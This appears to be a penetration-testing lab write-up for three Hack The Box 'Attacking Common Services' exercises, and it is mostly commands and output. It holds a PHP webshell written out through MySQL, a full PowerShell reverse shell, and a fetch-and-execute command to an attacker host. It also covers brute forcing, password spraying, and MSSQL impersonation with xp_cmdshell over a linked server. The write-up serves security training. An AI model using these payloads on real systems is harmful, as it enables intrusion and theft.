# Attacking Common Services - Easy

Initial information
Target IP
Target Domain: inlanefreight.htb
Users wordlist: users.list

## Recon

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.95.94 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && nmap -p$ports -sC -sV 10.129.95.94
```

* FTP (21) → Core FTP Server 2.0 
* SMTP (25 / 587) → hMailServer 
* HTTP (80/443) → XAMPP com Apache + PHP 7.4.29 (provavelmente portal).
* MySQL (3306) → MariaDB 10.4.24 (provavelmente XAMPP default).
* RDP (3389) 

## Enumeration
Enumerating valid users on the SMTP server.

```bash
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.95.94
```

Was found fiona@inlanefreight.htb.

## Brute forcing in smtp server

```bash
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.95.94 -V
```

Fiona’s password is 987654321.

There were no IMAP or POP3 servers available for access.

With these credentials, it was possible to access the FTP server, but only two irrelevant files were present.

RDP access was also attempted, however the credentials were not valid.

Then, upon attempting to access MySQL, access was successful.

```bash
mysql -h 10.129.95.94 -u fiona -p 
```

## MySQL enumeration
Accessing and analyzing the databases and tables has found only the fiona and default user.
 
Checking secure_file_priv, it is empty, which means it is possible to read and write files.

```bash
MariaDB [information_schema]> show variables like "secure_file_priv";
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.009 sec)
```

1. **Creating a webshell file via MySQL**

```bash
SELECT '<?php echo shell_exec($_GET["c"]); ?>'
INTO OUTFILE 'C:\\xampp\\htdocs\\webshell.php';
```

2. **On the local machine, create a file to reverse shell with powershell.**

```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.25",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
$client.Close()
```

3. **Prepare the server to host the powershell reverse shell and the server to receive the reverse shell. Then access the webshell to download  the powershell reverse shell from the local machine.**

```bash
http://10.129.95.94/webshell.php?c=powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.25:8080/shell.ps1')"
```

4. **Upon receiving the reverse shell.**

```bash
PS C:\Users> cat Administrator\Desktop\flag.txt
```
# Attacking Common Services - Medium

## Recon

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.201.127 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && nmap -p$ports -sC -sV 10.129.201.127
```

* 22/tcp SSH → OpenSSH 8.2p1 Ubuntu 20.04 padrão
* 53/tcp DNS → ISC BIND 9.16.1
* 110/tcp POP3 → Dovecot pop3d
* 995/tcp POP3S → Dovecot SSL
* 2121/tcp FTP → ProFTPD, banner: “InlaneFTP”
* 30021/tcp FTP → ProFTPD, banner: “Internal FTP”


The FTP server on 2121 port doesn't allow anonymous access, nonetheless, the FTP on 30021 port does allow anonymous access. 

```bash
ftp 10.129.201.127 30021
Connected to 10.129.201.127.
220 ProFTPD Server (Internal FTP) [10.129.201.127]
Name (10.129.201.127:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
```

On this FTP server, there was a directory named ‘simon’, which appears to be a username. Inside this dir, a file named ‘mynotes.txt’ was found, its content appears to contain passwords. 

```bash
cat mynotes.txt
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

## DNS subdomains enumeration
Searching for subdomains via DNS, since the 53 port is open.

```bash
echo "10.129.201.127" > ./resolvers.txt
```

```bash
./subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
```

* app.inlanefreight.htb
* ns.inlanefreight.htb
* dc1.inlanefreight.htb
* dc2.inlanefreight.htb
* Un.inlanefreight.htb
* ws1.inlanefreight.htb
* ws2.inlanefreight.htb

Only the main domain allowed zone transfer.

```bash
dig axfr @ns.inlanefreight.htb inlanefreight.htb

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr @ns.inlanefreight.htb inlanefreight.htb
; (1 server found)
;; global options: +cmd
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
app.inlanefreight.htb.	604800	IN	A	10.129.200.5
dc1.inlanefreight.htb.	604800	IN	A	10.129.100.10
dc2.inlanefreight.htb.	604800	IN	A	10.129.200.10
int-ftp.inlanefreight.htb. 604800 IN	A	127.0.0.1
int-nfs.inlanefreight.htb. 604800 IN	A	10.129.200.70
ns.inlanefreight.htb.	604800	IN	A	127.0.0.1
un.inlanefreight.htb.	604800	IN	A	10.129.200.142
ws1.inlanefreight.htb.	604800	IN	A	10.129.200.101
ws2.inlanefreight.htb.	604800	IN	A	10.129.200.102
wsus.inlanefreight.htb.	604800	IN	A	10.129.200.80
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 9 msec
;; SERVER: 10.129.201.127#53(ns.inlanefreight.htb) (TCP)
;; WHEN: Mon Aug 25 15:52:10 CDT 2025
;; XFR size: 13 records (messages 1, bytes 372)
```

Beyond the subdomains discovered with SubBrute, zone transfer revealed more:

* int-ftp.inlanefreight.htb
* int-nfs.inlanefreight.htb
* wsus.inlanefreight.htb.


## POP3 Password Spraying
Assuming ‘simon’ is a username on the target system and ‘mynotes.txt’ contains a list of possible passwords, an attempt was made to obtain the simon’s credentials using password spraying.

```bash
hydra -l simon -P mynotes.txt -f 10.129.201.127 pop3
```

[110][pop3] host: 10.129.201.127   login: simon   password: 8Ns8j1b!23hs4921smHzwn

## Accessing POP3 server with simon credentials

```bash
telnet 10.129.201.127 110
```

A private key was found, probably of the SSH server.

```bash
RETR 1
+OK 1630 octets
From admin@inlanefreight.htb  Mon Apr 18 19:36:10 2022
Return-Path: <root@inlanefreight.htb>
X-Original-To: simon@inlanefreight.htb
Delivered-To: simon@inlanefreight.htb
Received: by inlanefreight.htb (Postfix, from userid 0)
	id 9953E832A8; Mon, 18 Apr 2022 19:36:10 +0000 (UTC)
Subject: New Access
To: <simon@inlanefreight.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20220418193610.9953E832A8@inlanefreight.htb>
Date: Mon, 18 Apr 2022 19:36:10 +0000 (UTC)
From: Admin <root@inlanefreight.htb>

Hi,
Here is your new key Simon. Enjoy and have a nice day..

 -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4 4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W 1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5 xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi 6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ== -----END OPENSSH PRIVATE KEY-----
```

## Accessing SSH

Create a file containing the discovered private key (id_rsa) and set its permissions to 600. Then access the SSH.

```bash
ssh -i id_rsa simon@10.129.201.127
```

```bash
simon@lin-medium:~$ ls
flag.txt  Maildir
```
# Attacking Common Services - Hard
The exercise questions already reveal two users ‘simon’ and ‘fiona’. Therefore, initial usernames enumeration is unnecessary, going directly to obtaining their credentials.

## Recon

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.201.127 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && nmap -p$ports -sC -sV 10.129.201.127
```

* 135/tcp - MSRPC
* 445/tcp - SMB
* 1433/tcp - MSSQL → Server 2019 RTM
* 3389/tcp - RDP → 10.0.17763 Windows Server 2019 (1809).


## Enumeration
Starting with SMB, as it was more likely to find credentials.

```
smbclient -N -L //10.129.31.140
```

The server allowed anonymous access.

```bash
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Home            Disk      
	IPC$            IPC       Remote IPC
```

## Accessing the Home Share

```bash
smbclient //10.129.31.140/Home
```

```bash
smb: \> ls
  HR  	 D        0  Thu Apr 21 15:04:39 2022
  IT  	 D        0  Thu Apr 21 15:11:44 2022
  OPS 	 D        0  Thu Apr 21 15:05:10 2022
  Projects  D        0  Thu Apr 21 15:04:48 2022
```

In the IT directory were found folders with usernames.

```bash
smb: \IT\> ls
  Fiona   D        0  Thu Apr 21 15:11:53 2022
  John    D        0  Thu Apr 21 16:15:09 2022
  Simon   D        0  Thu Apr 21 16:16:07 2022
```

A new user was found: ‘John’.

**Fiona**

```bash
smb: \IT\Fiona\> ls
  creds.txt  A      118  Thu Apr 21 15:13:11 2022
```

```bash
cat creds.txt
Windows Creds

kAkd03SA@#!
48Ns72!bns74@S84NNNSl
SecurePassword!
Password123!
SecureLocationforPasswordsd123!!
```
Apparently a file containing passwords.

**John**

```bash
smb: \IT\John\> ls
  information.txt   A      101  Thu Apr 21 16:14:58 2022
  notes.txt         A      164  Thu Apr 21 16:13:40 2022
  secrets.txt       A       99  Thu Apr 21 16:15:55 2022
```

```bash
cat secrets.txt
Password Lists:

1234567
(DK02ka-dsaldS
Inlanefreight2022
Inlanefreight2022!
TestingDB123

cat information.txt
To do:
- Keep testing with the database.
- Create a local linked server.
- Simulate Impersonation.
```

Another file apparently containing passwords, and a file whose content appear  to provide tips for focusing on database, impersonating a user, and using a local linked server.

**Simon**

```bash
smb: \IT\Simon\> ls
  random.txt  A       94  Thu Apr 21 16:16:48 2022
```

```bash
cat random.txt
Credentials

(k20ASD10934kadA
KDIlalsa9020$
JT9ads02lasSA@
Kaksd032klasdA#
```

## Discovering users password - Password spraying

**Fiona**

```bash
hydra -l fiona -P creds.txt 10.129.31.140 rdp
[3389][rdp] host: 10.129.31.140   login: fiona   password: 48Ns72!bns74@S84NNNSl
```

**Simon**

```bash
nxc smb 10.129.31.140 -u simon -p random.txt
SMB         10.129.31.140   445    WIN-HARD         [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
SMB         10.129.31.140   445    WIN-HARD         [+] WIN-HARD\simon:(k20ASD10934kadA
```

**John**

```bash
nxc smb 10.129.31.140 -u john -p secrets.txt
SMB         10.129.31.140   445    WIN-HARD         [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
SMB         10.129.31.140   445    WIN-HARD         [+] WIN-HARD\john:1234567 
```

Only Fiona has RDP access. 
All users have read permission only in Home and IPC$ SMB shares. 

```bash
nxc smb 10.129.31.140 -u 'john' -p '1234567' --shares

SMB         10.129.31.140   445    WIN-HARD         [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
SMB         10.129.31.140   445    WIN-HARD         [+] WIN-HARD\john:1234567 
SMB         10.129.31.140   445    WIN-HARD         [*] Enumerated shares
SMB         10.129.31.140   445    WIN-HARD         Share           Permissions     Remark
SMB         10.129.31.140   445    WIN-HARD         -----           -----------     ------
SMB         10.129.31.140   445    WIN-HARD         ADMIN$                          Remote Admin
SMB         10.129.31.140   445    WIN-HARD         C$                              Default share
SMB         10.129.31.140   445    WIN-HARD         Home            READ            
SMB         10.129.31.140   445    WIN-HARD         IPC$            READ            Remote IPC
```

## Accessing RDP with Fiona’s credentials.

```bash
xfreerdp /u:fiona /p:'48Ns72!bns74@S84NNNSl' /v:10.129.31.140 /dynamic-resolution
```

Fiona is the only windows system user among the three users found.

**Checking permissions**

```bash
C:\Users\Fiona>whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID                                           Attributes
====================================== ================ ============================================= ==================================================
Everyone                               Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
WIN-HARD\Database Readers              Alias            S-1-5-21-4146269335-928890532-3128802874-1010 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                     Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

**WIN-HARD\Database Readers**     
Users in this group can connect to databases for data querying, but cannot modify anything, do not have read or admin permissions.

## Accessing the database

```bash
C:\Users\Fiona>sqlcmd -S localhost -E
1> SELECT name FROM sys.databases WHERE database_id > 4;
2> go
name
--------------------------------------------------------------------------------------------------------------------------------
TestingDB
TestAppDB
```

Nothing was found in ‘TestingDB’ and Fiona does not have permission to access ‘TestAppDB’.

## Impersonate users
Following the tips in the ‘information.txt’ file, an attempt was made to impersonate a database user.

**Checking which users can be impersonated**

```bash
2> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
3> go
name
--------------------------------------------------------------------------------------------------------------------------------
john
simon
```

**Impersonate user Simon** 

```bash
1> EXECUTE AS LOGIN = 'simon'
2>
3> go
1> SELECT SYSTEM_USER
2> go

--------------------------------------------------------------------------------------------------------------------------------
simon
```

Simon has permission to access TestAppDB.

```bash
(1 rows affected)
1> use TestAppDB
2> go
Changed database context to 'TestAppDB'.
1>
```

A tb_users table was found

```bash
1> select * from tb_users;
2> go
username                                           password                                           privileges
-------------------------------------------------- -------------------------------------------------- --------------------------------------------------
patric                                             Testuser123!                                       user
julio                                              Testadmin123!                                      admin
```

Julio is an admin user, however it is unknown where he comes from.

One of the tips in the ‘information.txt’ file is about the linked server. However, it was not possible for Fiona and Simon to use it.

```bash
1> SELECT srvname, isremote FROM sysservers
2> go
srvname                                                                                                                          isremote
-------------------------------------------------------------------------------------------------------------------------------- --------
WINSRV02\SQLEXPRESS                                                                                                                     1
LOCAL.TEST.LINKED.SRV                                                                                                                   0
```

## Impersonate user John 

```bash
1> USE master
2> go
Changed database context to 'master'.
1> EXECUTE AS LOGIN = 'john'
2> go
1> SELECT SYSTEM_USER
2> go
--------------------------------------------------------------------------------------------------------------------------------
john
```

**Checking privileges on the linked server**

```bash
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
2> go
                                                                                                                                                       
WINSRV02\SQLEXPRESS                                                                                                              Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
                                                                                     testadmin      
```

John is testadmin on the linked server. 

```bash
1> EXECUTE('
2~ EXEC sp_configure ''show advanced options'', 1;
3~ RECONFIGURE;
4~ EXEC sp_configure ''xp_cmdshell'', 1;
5~ RECONFIGURE;
6~ ') AT [LOCAL.TEST.LINKED.SRV];
7> GO
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
1> EXECUTE('EXEC master.dbo.xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV];
2> go
output                                                                                                                                                                                                                                          

nt authority\system                                                                                                                              
```

## Obtaining the flag

```bash
1> EXECUTE('EXEC master.dbo.xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV];
2>
3> go
output                                                                                                                                                                                                                                          

HTB{46u$!n9_l!nk3d_$3rv3r$} 
```

Or without xp_cmdshell: 

```bash
1> SELECT * FROM OPENQUERY([LOCAL.TEST.LINKED.SRV],     'SELECT * FROM OPENROWSET(BULK  ''C:\Users\Administrator\Desktop\flag.txt'', SINGLE_CLOB) AS flag');
2> go
BulkColumn                                                                                                                                                                                                                                      

HTB{46u$!n9_l!nk3d_$3rv3r$}
```
